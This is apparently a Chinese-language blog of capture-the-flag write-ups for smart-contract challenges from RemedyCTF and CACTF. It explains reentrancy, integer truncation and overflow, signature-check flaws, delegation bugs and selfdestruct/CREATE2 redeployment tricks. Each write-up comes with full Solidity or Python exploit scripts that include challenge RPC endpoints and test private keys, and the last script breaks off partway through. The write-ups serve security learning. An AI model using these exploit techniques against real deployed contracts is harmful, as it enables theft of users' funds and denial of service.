但是在Marketplace合约中，我们发现`Unstake`函数在`safeTransferFrom`后会进行`swapCUSDCforUSDC`操作，而传入的参数`recipient`（`prevOwner`）和函数中的`_iLockToken.ownerOf(tokenId)`（NFT实际持有者）可能会不一致，最后导致本应该发放给NFT持有者的奖励被发放给`prevOwner`，因此我们可以从这里开始下手

同时我们还发现Token中对`beforeTokenTransfer`的实现存在问题：如果`from`或者`to`为市场本身的时候，则不会修改`prevOwner`，因此假如我们已经让`prevOwner`获了一次利，此时我们直接再质押并取消后，就能产生双倍利润；除此之外，只有`beforeTokenTransfer`会修改`prevOwner`，因此我们需要首先进行一次带`onERC721Received`的重入操作，在第一次质押并取消的时候触发重入，让`prevOwner`修改为我们一个Alt Account，此时我们的`prevOwner`在取消质押的时候就能设置一个虚空的`_cUSDCInterest`后获取质押奖励；第2次则不需要重入，直接质押并取消即可再次获利，从而翻倍奖励

这里附上榜一大哥们公开的解题脚本，我到现在还有点懵圈所以就没有自己写QAQ

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "src/interfaces/ILockMarketplace.sol";
import "src/interfaces/ILockToken.sol";
import "src/interfaces/ICERC20.sol";
import "src/interfaces/IComptroller.sol";

interface IChallenge {
    function USDC() external returns (IERC20);
    function CUSDC() external returns (IERC20);
    function COMPTROLLER() external returns (IComptroller);
    function LOCK_MARKETPLACE() external returns (ILockMarketplace);
    function LOCK_TOKEN() external returns (ILockToken);
}

contract Proxy {
    uint256 mode;
    IChallenge public chal;
    ILockMarketplace public m;
    ILockToken public t;
    IERC20 usdc;
    address a;
    address b;
    address c;
    uint160 i;
    uint256 lastTokenId;
    
    constructor(IChallenge _chal) {
        chal = _chal;
        m = chal.LOCK_MARKETPLACE();
        t = chal.LOCK_TOKEN();
        usdc = chal.USDC();
    }

    function mintWithUSDC(address to, uint256 usdcAmount) external returns (uint256) {
        usdc.approve(address(m), usdcAmount);
        return m.mintWithUSDC(to, usdcAmount);
    }

    function stake(uint256 tokenId, uint256 usdcAmount) external {
        t.approve(address(m), tokenId);
        return m.stake(tokenId, usdcAmount);
    }

    function unStake(address to, uint256 tokenId) external {
        return m.unStake(to, tokenId);
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        t.transferFrom(from, to, tokenId);
    }

    function set_mode(uint256 _mode) external {
        mode = _mode;
    }

    function set_addr_a(address addr) external {
        a = addr;
    }

    function set_addr_b(address addr) external {
        b = addr;
    }

    function set_addr_c(address addr) external {
        c = addr;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        if (mode == 1) {
            t.transferFrom(address(this), c, tokenId);
            Proxy(c).transferFrom(address(c), a, tokenId);
        }
        lastTokenId = tokenId;
        return this.onERC721Received.selector;
    }

    function claim() external {
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));

        i += 1;
        t.transferFrom(address(this), address(uint160(address(this)) + i), lastTokenId);
    }

    function withdrawUSDC(uint256 tokenId, uint256 amount) external {
        m.withdrawUSDC(tokenId, amount);
    }

    function redeemCompoundRewards(uint256 tokenId, uint256 rewardAmount) external {
        m.redeemCompoundRewards(tokenId, rewardAmount);
    }
}

contract Exploit {
    IChallenge public chal;
    ILockMarketplace public m;
    IERC20 public usdc;
    IERC20 public cusdc;
    Proxy public a;
    Proxy public b;
    Proxy public c;

    constructor(IChallenge _chal) {
        chal = _chal;
        m = chal.LOCK_MARKETPLACE();
        usdc = chal.USDC();
        cusdc = chal.CUSDC();

        a = new Proxy(_chal);
        b = new Proxy(_chal);
        c = new Proxy(_chal);

        b.set_addr_a(address(a));
        b.set_addr_c(address(c));

        c.set_addr_a(address(a));
        c.set_addr_b(address(b));
    }

    function pwn() external {
        uint256 amount_1;
        uint256 amount_2;
        uint256 tokenId;
        uint256 tokenId2;
        uint256 tokenId3;
        uint256 c_rewards;
        uint256 m_balance;
        uint256 c_deposit;

        for (uint256 i = 0; i < 12; i++) {
            console.log("i", i);

            amount_1 = usdc.balanceOf(address(this)) - 100e6;
            if (i == 11)
                amount_1 = 364921e6 + 101e6;
            amount_2 = 100e6;

            console.log("amount_1", amount_1/1e6);

            usdc.transfer(address(a), amount_1);
            usdc.transfer(address(b), amount_2);

            tokenId = a.mintWithUSDC(address(a), amount_1);
            a.stake(tokenId, amount_1 - 20e6);

            tokenId2 = b.mintWithUSDC(address(b), amount_2);
            b.stake(tokenId2, amount_2 - 20e6);
            b.set_mode(1);
            b.unStake(address(b), tokenId2);
            b.set_mode(0);

            a.transferFrom(address(a), address(b), tokenId2);
            b.withdrawUSDC(tokenId2, m.getDeposit(tokenId2));
            b.claim();

            a.unStake(address(a), tokenId);
            a.withdrawUSDC(tokenId, m.getDeposit(tokenId));
            a.claim();

            // c should have inflated _rewardsBalance
            c_rewards = m.getAvailableRewards(address(c));
            console.log("_rewardsBalance[c]", c_rewards/1e6);

            usdc.transfer(address(c), amount_2);
            tokenId3 = c.mintWithUSDC(address(c), amount_2);
            c_deposit = m.getDeposit(tokenId3);
            if (c_deposit != 0)
                c.withdrawUSDC(tokenId3, c_deposit);
            m_balance = usdc.balanceOf(address(m));
            if (m_balance != 0)
                c.redeemCompoundRewards(tokenId3, c_rewards > m_balance ? m_balance : c_rewards);
            c.claim();

            console.log("balanceOf(this)", usdc.balanceOf(address(this))/1e6);
            console.log("usdc.balanceOf(m)", usdc.balanceOf(address(m))/1e6);
            console.log("cusdc.balanceOf(m)", cusdc.balanceOf(address(m)));
            console.log("cusdc.balanceOf(m) < 0.01e18", cusdc.balanceOf(address(m)) < 0.01e18);
        }

        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }
}

contract ExploitScript is Script {
    uint256 public privateKey = 0x264dc4c5e6f74aa75583dd3e7f8784e072511ab505012e43f8bef980174b6467;
    IChallenge public chal = IChallenge(0xb5284fE2119E23c672A80Ac11B05c67D3c072eAf);

    function setUp() public {}

    function run() public {
        vm.startBroadcast(privateKey);
        Exploit e = new Exploit(chal);
        chal.USDC().transfer(address(e), 500e6);
        e.pwn();
        vm.stopBroadcast();
    }
}
```

# 2025-08-06

欸，RemedyCTF还有一个最简单的题目Rich Man's Bet，下面是Writeup（附件也不给了）

这题相比前面的Diamond Heist，合约数量大幅降低，但是作为一个治理合约这题难度也不低（虽然也是并列第3高解出的题目）

那么还是老样子，先分析一下合约内容：

- AdminNFT.sol是一个基础的ERC1155合约，这种合约支持多个代币的存储和批量转发
- Challenge.sol里面包含了我们的最终目标：完成“挑战”并且将跨链桥合约的余额全部转走（虽然这题并没有也不需要跨链），至于挑战就是非常简单的3个数学题，随便代进去几个数就做出来了
- 核心合约Bridge.sol是一个ERC1155Receiver合约，说明这个合约支持ERC1155的多代币批量转发操作，同时我们也能看到有个`onERC1155Received`，即接收到ERC1155转入的代币会自动调用该函数，同理还有个`onERC1155BatchReceived`会在接收到批量转发的代币的时候被调用 当然作为治理合约，肯定有治理逻辑，这里就是通过NFT的Power进行治理的：Admin持有的NFT的Power是10000 ether，而一般的NFT只有50 ether，而更改跨链桥设置需要所有签名人的Power大于总数的一半且都为Validator，而最终的`withdrawEth`则需要所有支持提款的总人数超过阈值（Challenge.sol设定为10）且都在初始设定的`withdrawValidator`名单中，但是很明显除了合约自己我们谁都不在名单里面...

好的，现在让我们开始做题，首先我们可以很快得到三道数学题的一组合法解，解出来后在Bridge中验证挑战即可完成`isSolved`的前面2个要求：

```Python
def main():
    # 1. Solve the 3 stages
    # Q1: 6  Q2: 59,101  Q3: 1 0 2
    print("\nSolving stages...")
    send_transaction(challenge.functions.solveStage1(6), account)
    print("\nStage 1 completed")
    send_transaction(challenge.functions.solveStage2(59, 101), account)
    print("\nStage 2 completed")
    send_transaction(challenge.functions.solveStage3(1, 0, 2), account)
    print("\nStage 3 completed")

    # 2. Verify challenge
    send_transaction(bridge.functions.verifyChallenge(), account)
    if challenge.functions.challengeSolved().call():
        print("\nChallenge verified")
    else:
        print("\nChallenge failed")
```

接下来我们进行提款，上面提到了没有人能够提款，因此我们只能尝试让threshold变为0，而唯二能更改threshold的值的地方只有constructor和`changeBridgeSettings`两个地方，也就是说我们就是得更新设置，那么我们有需要成为Validator，而能成为Validator的地方就只有两个`onERC1155(Batch)Received`了，也就是说我们就是得向Bridge转入代币...吗？

仔细查看ERC1155的实现，我们发现如果id和amount两个数组为空数组（即转入0种代币）也是会正常调用目标ERC1155Receiver的`onERC1155BatchReceived`函数的，而Bridge中并没有检测转入的代币种类是否为0，所以我们只需要转入0种代币即可：

```Python
make_validator = lambda acc: send_transaction(
    admin_nft.functions.safeBatchTransferFrom(
        acc.address, bridge.address, [], [], w3.to_bytes(text="")
    ),
    acc,
    gas=150000,
)
```

然后进入到`changeBridgeSettings`的部分，我们发现验证签名是否有效的时候只会记录`lastSigner`并和其比对，那么我们只需要有至少2个签名就能进行无限的验证，从而达到刷Power的目的，因此我们只需要再新创建一个地址并让它签一下名就行了，当然前置是需要这个地址也成为Validator；修改的设置中我们只需要修改threshold，但是这个新的threshold必须大于1...看起来没有办法，但是仔细看一下函数传入的数据类型：是一个uint256，而最后使用的threshold是一个uint96，中间进行了一次显式类型转换，也就是说如果我们传入的数很大，类型转换会产生数据丢失，比如我们传入的newThreshold是$$2^{96}$$，那么最后我们会有threshold = uint96(newThreshold) = 0

所以我们根据上面的理论更新完设置后直接withdrawEth就行了，签名列表为空就行，最后的脚本如下：（有些多余的ABI可以删掉，因为没有调用到）

```Python
# 3f716403f4394aa3c38997b1aeebed19
# [rich-mans-bet] RPC Endpoints:
# [rich-mans-bet]     - http://46.101.119.98:8545/oeYWbzukdrAnjozjEiXuGxtH/main
# [rich-mans-bet]     - ws://46.101.119.98:8545/oeYWbzukdrAnjozjEiXuGxtH/main/ws
#
# [rich-mans-bet] The Player private key:         0x2f24a9c9f818b1315f24eb909f85cefb6ea66bc31fc77744778acc400d6d3ba0
# [rich-mans-bet] The Challenge contract address: 0x3346B289790b9328b4661193DaEADDcD6a4a5B3a

from web3 import Web3
from eth_account import Account
from eth_account.messages import encode_typed_data, encode_defunct
import eth_abi
import time

RPC_URL = "http://46.101.119.98:8545/emjhmdIoWPlMCHBRzbGAHdBe/main"
w3 = Web3(Web3.HTTPProvider(RPC_URL))

PRIVATE_KEY = "0xc9607d2731ff52283f710a04251fa72f9819b072cd2c44e3f5367c9ee6dbf731"
CHALLENGE_ADDRESS = "0x553c30968D4233048Bd9E2153D442ab24511960B"
account = Account.from_key(PRIVATE_KEY)

def send_transaction(contract_function, account, nonce_offset=0, value=0, gas=500000):
    """Helper function to send transactions"""
    transaction = contract_function.build_transaction(
        {
            "from": account.address,
            "nonce": w3.eth.get_transaction_count(account.address) + nonce_offset,
            "gas": gas,
            "maxFeePerGas": w3.eth.gas_price * 2,
            "maxPriorityFeePerGas": w3.eth.gas_price,
            "value": w3.to_wei(value, "ether"),
        }
    )
    return send_signed(transaction, account)

def send_signed(transaction, account):
    signed_txn = w3.eth.account.sign_transaction(transaction, account.key.hex())
    tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt

def init():
    global challenge, bridge, admin_nft
    challenge = w3.eth.contract(
        address=CHALLENGE_ADDRESS,
        abi=[
            # 此处省略abi
        ],
    )

    bridge = w3.eth.contract(
        address=challenge.functions.BRIDGE().call(),
        abi=[
            # 此处省略abi
        ],
    )

    admin_nft = w3.eth.contract(
        address=challenge.functions.ADMIN_NFT().call(),
        abi=[
            # 此处省略abi
        ],
    )

def main():
    # 1. Solve the 3 stages
    # Q1: 6  Q2: 59,101  Q3: 1 0 2
    print("\nSolving stages...")
    send_transaction(challenge.functions.solveStage1(6), account)
    print("\nStage 1 completed")
    send_transaction(challenge.functions.solveStage2(59, 101), account)
    print("\nStage 2 completed")
    send_transaction(challenge.functions.solveStage3(1, 0, 2), account)
    print("\nStage 3 completed")

    # 2. Verify challenge
    send_transaction(bridge.functions.verifyChallenge(), account)
    if challenge.functions.challengeSolved().call():
        print("\nChallenge verified")
    else:
        print("\nChallenge failed")

init()
main()
# print(bridge.functions.threshold().call())
# exit(0)

print(w3.from_wei(w3.eth.get_balance(account.address), "ether"))
make_validator = lambda acc: send_transaction(
    admin_nft.functions.safeBatchTransferFrom(
        acc.address, bridge.address, [], [], w3.to_bytes(text="")
    ),
    acc,
    gas=150000,
)
new_acc = w3.eth.account.create()
print(
    send_signed(
        {
            "to": new_acc.address,
            "value": w3.to_wei("0.03", "ether"),
            "gas": 21000,
            "gasPrice": w3.to_wei("50", "gwei"),
            "chainId": w3.eth.chain_id,  # Mainnet: 1, Goerli: 5, etc.
            "nonce": w3.eth.get_transaction_count(account.address),
        },
        account,
    )
)
print(make_validator(account))
print(make_validator(new_acc))

message = eth_abi.encode(
    ["address", "address", "uint256"], [challenge.address, admin_nft.address, 2**96]
)
signed_message_a = w3.eth.account.sign_message(
    encode_defunct(message), private_key=PRIVATE_KEY
)
signed_message_b = w3.eth.account.sign_message(
    encode_defunct(message), private_key=new_acc.key
)

message_hash = message  # From step 1
receiver = account.address  # Replace with the actual receiver address
amount = 1000000000000000000  # Example amount in wei (1 ETH)
callback = Web3.to_bytes(text="example_callback_data")  # Example callback data

# Prepare the arguments
signatures = [
    signed_message_a.signature,
    signed_message_b.signature,
] * 70
print(
    send_transaction(
        bridge.functions.changeBridgeSettings(message_hash, signatures),
        account,
        gas=3000000,
    )
)

print(
    send_transaction(
        bridge.functions.withdrawEth(
            Web3.to_bytes(b"nyaaaaa".ljust(32)),
            [],
            account.address,
            w3.to_wei(1000, "ether"),
            callback,
        ),
        account,
    )
)
```

------

老传统，再接一题吧，同个比赛的题目Frozen Voting：

根据提供的题目合约，我们可以知道ADMIN在mint了一个10000票权的NFT后delegate给了我们自己，同时我们自己有一个1票权的NFT，此时我们的票权为10001；而最后的`isSolved`会尝试更换delegate并转移走10000票权的NFT，而我们的目标就是阻止这次操作

那么其实很明显了：我们唯一能做的就是在第一步更换delegate的时候做手脚，而NFT在发生所有权变更的时候一定会调用`_delegate`，而其中的`_moveDelegates`会减去上一任delegatee的票权并加到下一位那里，因此很简单：我们要想办法通过`_delegate`让自己的票权小于10000，从而触发整型下溢以实现DoS攻击

经过一点简单的代码审计，我们发现`delegateBySig`函数有点小小的问题：相比`delegate`函数，它缺少了对`delegatee`参数是否为`address(0)`的确认与操作，从而使得我们可以将自己的NFT通过`delegateBySig`函数delegate给0x0地址，而根据`_moveDelegates`函数，此时我们的票权会-1，而没有人的票权会上升（合约误以为我们销毁了NFT），因此此时我们再一次进行`delegateBySig`或者直接`transferFrom`给任意的地址即可让我们的票权达到9999，进而实现前面的目的

下面是forge的解题script：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFSolver.sol";

import "src/Challenge.sol";

contract Solve is CTFSolver {
    function solve(address challenge, address player) internal override {
        uint256 playerPrivateKey = vm.envOr(
            "PLAYER",
            uint256(
                0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
            )
        );
        Challenge ch = Challenge(challenge);
        VotingERC721 votingToken = ch.votingToken();

        address delegatee = address(0x0);
        uint256 nonce = votingToken.nonces(player);
        uint256 expiry = block.timestamp + 1 days;
        bytes32 DOMAIN_TYPEHASH = votingToken.DOMAIN_TYPEHASH();
        bytes32 DELEGATION_TYPEHASH = votingToken.DELEGATION_TYPEHASH();
        bytes32 domainSeparator = keccak256(
            abi.encode(
                DOMAIN_TYPEHASH,
                keccak256("VotingERC721"),
                block.chainid,
                address(votingToken)
            )
        );
        bytes32 structHash = keccak256(
            abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry)
        );
        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, structHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
        votingToken.delegateBySig(delegatee, nonce, expiry, v, r, s);

        address account2 = address(0x1);
        votingToken.transferFrom(player, account2, 123);

        ch.isSolved();
    }
}
```

# 2025-08-05

凌晨学完，白天就不用学了（确信）

接着看看CACTF的压轴题EldoriaGate吧：

```solidity
// EldoriaGate.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

/***
    Malakar 1b:22-28, Tales from Eldoria - Eldoria Gates
  
    "In ages past, where Eldoria's glory shone,
     Ancient gates stand, where shadows turn to dust.
     Only the proven, with deeds and might,
     May join Eldoria's hallowed, guiding light.
     Through strict trials, and offerings made,
     Eldoria's glory, is thus displayed."
  
                   ELDORIA GATES
             *_   _   _   _   _   _ *
     ^       | `_' `-' `_' `-' `_' `|       ^
     |       |                      |       |
     |  (*)  |     .___________     |  \^/  |
     | _<#>_ |    //           \    | _(#)_ |
    o+o \ / \0    ||   =====   ||   0/ \ / (=)
     0'\ ^ /\/    ||           ||   \/\ ^ /`0
       /_^_\ |    ||    ---    ||   | /_^_\
       || || |    ||           ||   | || ||
       d|_|b_T____||___________||___T_d|_|b
  
***/

import { EldoriaGateKernel } from "./EldoriaGateKernel.sol";

contract EldoriaGate {
    EldoriaGateKernel public kernel;

    event VillagerEntered(address villager, uint id, bool authenticated, string[] roles);
    event UsurperDetected(address villager, uint id, string alertMessage);
    
    struct Villager {
        uint id;
        bool authenticated;
        uint8 roles;
    }

    constructor(bytes4 _secret) {
        kernel = new EldoriaGateKernel(_secret);
    }

    function enter(bytes4 passphrase) external payable {
        bool isAuthenticated = kernel.authenticate(msg.sender, passphrase);
        require(isAuthenticated, "Authentication failed");

        uint8 contribution = uint8(msg.value);        
        (uint villagerId, uint8 assignedRolesBitMask) = kernel.evaluateIdentity(msg.sender, contribution);
        string[] memory roles = getVillagerRoles(msg.sender);
        
        emit VillagerEntered(msg.sender, villagerId, isAuthenticated, roles);
    }

    function getVillagerRoles(address _villager) public view returns (string[] memory) {
        string[8] memory roleNames = [
            "SERF", 
            "PEASANT", 
            "ARTISAN", 
            "MERCHANT", 
            "KNIGHT", 
            "BARON", 
            "EARL", 
            "DUKE"
        ];

        (, , uint8 rolesBitMask) = kernel.villagers(_villager);

        uint8 count = 0;
        for (uint8 i = 0; i < 8; i++) {
            if ((rolesBitMask & (1 << i)) != 0) {
                count++;
            }
        }

        string[] memory foundRoles = new string[](count);
        uint8 index = 0;
        for (uint8 i = 0; i < 8; i++) {
            uint8 roleBit = uint8(1) << i; 
            if (kernel.hasRole(_villager, roleBit)) {
                foundRoles[index] = roleNames[i];
                index++;
            }
        }

        return foundRoles;
    }

    function checkUsurper(address _villager) external returns (bool) {
        (uint id, bool authenticated , uint8 rolesBitMask) = kernel.villagers(_villager);
        bool isUsurper = authenticated && (rolesBitMask == 0);
        emit UsurperDetected(
            _villager,
            id,
            "Intrusion to benefit from Eldoria, without society responsibilities, without suspicions, via gate breach."
        );
        return isUsurper;
    }
}


// EldoriaGateKernal.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

contract EldoriaGateKernel {
    bytes4 private eldoriaSecret;
    mapping(address => Villager) public villagers;
    address public frontend;

    uint8 public constant ROLE_SERF     = 1 << 0;
    uint8 public constant ROLE_PEASANT  = 1 << 1;
    uint8 public constant ROLE_ARTISAN  = 1 << 2;
    uint8 public constant ROLE_MERCHANT = 1 << 3;
    uint8 public constant ROLE_KNIGHT   = 1 << 4;
    uint8 public constant ROLE_BARON    = 1 << 5;
    uint8 public constant ROLE_EARL     = 1 << 6;
    uint8 public constant ROLE_DUKE     = 1 << 7;
    
    struct Villager {
        uint id;
        bool authenticated;
        uint8 roles;
    }

    constructor(bytes4 _secret) {
        eldoriaSecret = _secret;
        frontend = msg.sender;
    }

    modifier onlyFrontend() {
        assembly {
            if iszero(eq(caller(), sload(frontend.slot))) {
                revert(0, 0)
            }
        }
        _;
    }

    function authenticate(address _unknown, bytes4 _passphrase) external onlyFrontend returns (bool auth) {
        assembly {
            let secret := sload(eldoriaSecret.slot)            
            auth := eq(shr(224, _passphrase), secret)
            mstore(0x80, auth)
            
            mstore(0x00, _unknown)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x00, 0x40)
            
            let packed := sload(add(villagerSlot, 1))
            auth := mload(0x80)
            let newPacked := or(and(packed, not(0xff)), auth)
            sstore(add(villagerSlot, 1), newPacked)
        }
    }

    function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) {
        assembly {
            mstore(0x00, _unknown)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x00, 0x40)

            mstore(0x00, _unknown)
            id := keccak256(0x00, 0x20)
            sstore(villagerSlot, id)

            let storedPacked := sload(add(villagerSlot, 1))
            let storedAuth := and(storedPacked, 0xff)
            if iszero(storedAuth) { revert(0, 0) }

            let defaultRolesMask := ROLE_SERF
            roles := add(defaultRolesMask, _contribution)
            if lt(roles, defaultRolesMask) { revert(0, 0) }

            let packed := or(storedAuth, shl(8, roles))
            sstore(add(villagerSlot, 1), packed)
        }
    }

    function hasRole(address _villager, uint8 _role) external view returns (bool hasRoleFlag) {
        assembly {
            mstore(0x0, _villager)
            mstore(0x20, villagers.slot)
            let villagerSlot := keccak256(0x0, 0x40)
        
            let packed := sload(add(villagerSlot, 1))
            let roles := and(shr(8, packed), 0xff)
            hasRoleFlag := gt(and(roles, _role), 0)
        }
    }
}


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

import { EldoriaGate } from "./EldoriaGate.sol";

contract Setup {
    EldoriaGate public TARGET;
    address public player;

    event DeployedTarget(address at);

    constructor(bytes4 _secret, address _player) {
        TARGET = new EldoriaGate(_secret);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public returns (bool) {
        return TARGET.checkUsurper(player);
    }
}
```

由题意我们需要使得`checkUsurper()`返回为True，而与之对应的是要让我们的role为0，其默认的值为`ROLE_SERF`即1

说句实话题目合约真没有什么能让我们交互的，因此说白了就是通过调用`enter()`来实现修改role的操作，那就让我们一步步看：

首先会进行一次`authenticate(bytes4 passphrase)`去匹配密码是否正确，而密码被存放在Kernal的Storage Slot 0处，因此我们直接用cast去获取指定存储槽内数据即可

通过认证后会调用Kernal的`evaluateIdentity`，而其中的`contribution`参数为我们发送的`msg.value`，好巧不巧Kernal中的实现里面判断role是通过`add(defaultRoleMask, _contribution)`实现的，虽然后面有`lt`小于判断，但是由于使用的是assembly，而且role是uint8数据类型，因此会存在整型溢出，所以只需要让`_contribution`为255就能让我们的role为0，从而解出本题

由于使用了非合约操作进行解题，这里就不放解题合约了，总之就是使用`cast storage --rpc-url "your rpc url" "kernal address" 0`读取Storage Slot获取密码后调用`enter{value: 255 wei}(password)`即可

暂且这样吧，明天开始复现一下那些纯Blockchain的CTF题



以防有人说我水，这里再放一个RemedyCTF最简单的题（除去签到题）Diamond Heist的Writeup，附件这里就不给出来了，6个合约杀了我吧（

这道题总共有6个合约，看起来非常恐怖，但是实际上是所有题目里面解出数第2高的（第1是签到）

- 首先分析Challenge.sol，里面的要求非常简单：获取所有的Diamond代币即可，然后初始给了自己10000 ether的HexensCoin代币，并且将所有的Diamond代币转到了Vault里
- VaultFactory.sol和名字一样，就是一个合约工厂，通过salt生成Vault合约，所以使用的是`CREATE2`操作码，至于使用的salt在Challenge.sol里面有，此处按下不表
- Diamond.sol很直白，就是一个普通的ERC20合约，知道这一点就行
- Burner.sol，一个销毁用合约，很直白
- 接下来是两个核心合约：首先来看HexensCoin.sol，这个合约也是一个ERC20合约，唯一的差别就是它添加了一个delegate机制（委托机制）：根据委托人所持有的HexensCoin数量，增加被委托人的Votes（即票数），而用户所持有的Votes数量仅在调用`_moveDelegates`函数的时候进行更新，且获取Votes仅会读取上一个Checkpoint的Votes数 但是问题就在于委托人将自己持有的HexensCoin通过transfer转移给其它用户的时候，被委托人的Votes仍旧不会发生改变（缺少了`beforeTokenTransfer`的override），因此这会导致Votes数可以刷上去，比如统一给A刷票，那首先让B调用`delegate(address(A))`后将自己的HexensCoin转给C，再让C进行delegate，以此类推
- 最后是Vault.sol，这是一个UUPS可升级代理合约，说明我们可以对这个合约进行升级，同时可以指定合约的implementation，也就是说我们可以尝试通过升级这个合约来达成恶意的操作；至于`governanceCall`我们可以通过刚刚提到的刷票方法进行调用，而`burn`的话则是可以让我们“销毁”掉Vault中所有的Diamond，至于为什么带双引号这里先卖个关子

注意看题目附件中的Challenge.py，里面说明本题区块链的分叉为Shanghai分叉，也就是说此时`selfdestruct`仍然可以在constructor以外被调用时删除合约字节码，因此我们可以销毁掉Vault再重新部署一个新的Vault并初始化，这样我们就拥有了金库的所有权；同时这个金库还可以升级为添加了恶意函数的金库，从而达成获取所有Diamond代币的目的

接下来我们回收一下伏笔：Burner自毁的操作，实际上只销毁了所有的ETH（甚至也没有，因为参数是`payable(address(this))`，也就是把ETH发送到本地址后销毁，ETH还在这个地址），而ERC20并不会随之消失，因为ERC20本质上还是一个合约，而ERC20的数量本质上也是合约的一个mapping的value，因此“被销毁的Diamond”仍然保留在创建的Burner的地址中

那么此时就到了高潮部分：已知创建Burner的时候使用的语句是new，说明使用的是CREATE操作码，而nonce是1（即Burner是Vault创建的第1个合约），所以如果我们重新创建的Vault的地址是一样的，那么创建的Burner的地址也是一样的；而创建Vault的时候使用的又是CREATE2，合约工厂地址固定、salt已知，所以我们只需要控制新创建的Vault的init_code（也就是constructor部分）一致就能保证新建的Vault一定是原先的Vault的地址

因此我们可以给原先的Vault添加2个新的函数：（`x.sol`）

```Solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "./openzeppelin-contracts/interfaces/IERC20.sol";
import "./openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";
import "./openzeppelin-contracts-upgradeable/proxy/utils/Initializable.sol";
import "./openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "./openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";

import "./Diamond.sol";
import "./Burner2.sol";
import "./HexensCoin.sol";

contract X is Initializable, UUPSUpgradeable, OwnableUpgradeable {
    uint public constant AUTHORITY_THRESHOLD = 100_000 ether;

    Diamond diamond;
    HexensCoin hexensCoin;

    function initialize(
        address diamond_,
        address hexensCoin_
    ) public initializer {
        __Ownable_init();
        diamond = Diamond(diamond_);
        hexensCoin = HexensCoin(hexensCoin_);
    }

    function governanceCall(bytes calldata data) external {
        require(
            msg.sender == owner() ||
                hexensCoin.getCurrentVotes(msg.sender) >= AUTHORITY_THRESHOLD
        );
        (bool success, ) = address(this).call(data);
        require(success);
    }

    function burn(address token, uint amount) external {
        require(msg.sender == owner() || msg.sender == address(this));
        Burner burner = new Burner();
        IERC20(token).transfer(address(burner), amount);
        burner.destruct();
    }

    function _authorizeUpgrade(address) internal view override {
        require(msg.sender == owner() || msg.sender == address(this));
        require(IERC20(diamond).balanceOf(address(this)) == 0);
    }

    function _selfdestruct() public {
        selfdestruct(payable(address(this)));
    }

    function new_sender() public {
        Burner burner = new Burner();
        burner.destruct2(address(diamond));
        IERC20(diamond).transfer(msg.sender, 31337);
    }
}
```

我们这个恶意的Vault添加了自毁函数以方便我们重新部署合约并获得owner权限，同时添加了`new_sender`函数创建并使用我们恶意的Burner合约将“被销毁”的Diamond重新发送给恶意Vault并最终发送到我们自己手上

恶意的Burner合约如下：（`Burner2.sol`）

```Solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "./Diamond.sol";

contract Burner {
    Diamond diamond;

    constructor() {}

    function destruct() external {
        selfdestruct(payable(address(this)));
    }

    function destruct2(address _diamond) external {
        diamond = Diamond(_diamond);
        diamond.transfer(msg.sender, 31337);
    }
}
```

那么至此我们的攻击路径就基本完成了：

[![0.png](https://i.postimg.cc/m2ZbdPCg/0.png)](https://postimg.cc/8s3QcPZ2)

可能有人会问：为什么要销毁再创建新的Vault？我升级后直接调用new_sender不就好了？欸，还记得CREATE操作码的nonce是什么吗？是这个合约已创建的合约数+1，也就是说如果此时调用new_sender那么nonce是2，那么我们是无法获取到Diamond的（因为压根就不在那），销毁是为了重置这个nonce，就这么简单

那么这里就给出一个（应该能够运行的）脚本吧，别被吓到了，大部分都是合约的ABI，核心逻辑在后面

```Python
from web3 import Web3
from eth_account import Account
import solcx

# Configuration
RPC_URL = "http://164.90.231.253:8545/RARSiytkQIREDxCMlQjaKzzX/main"
PRIVATE_KEY = "0x85aa8a192685c1994e222fa9abf0c5a3156d03f8da6f0712477bcd8f1d35bcd5"
CHALLENGE_ADDRESS = "0xDb95DC78E696E454bAEC14570523bba1397bF4d0"
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(PRIVATE_KEY)

def send_transaction(contract_function, account, privKey=PRIVATE_KEY):
    """Helper function to send transactions"""
    transaction = contract_function.build_transaction(
        {
            "from": account.address,
            "nonce": w3.eth.get_transaction_count(account.address),
            "gas": 500000,
            "maxFeePerGas": w3.eth.gas_price * 2,
            "maxPriorityFeePerGas": w3.eth.gas_price,
        }
    )

    signed_txn = w3.eth.account.sign_transaction(transaction, privKey)
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt

def transfer(to, amount):
    tx = {
        "from": account.address,
        "to": to,
        "value": amount,
        "gas": 500000,
        "gasPrice": w3.eth.gas_price,
        "nonce": w3.eth.get_transaction_count(account.address),
    }

    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt

def main():
    print(f"Connected to network. Chain ID: {w3.eth.chain_id}")
    print(f"Using account: {account.address}")

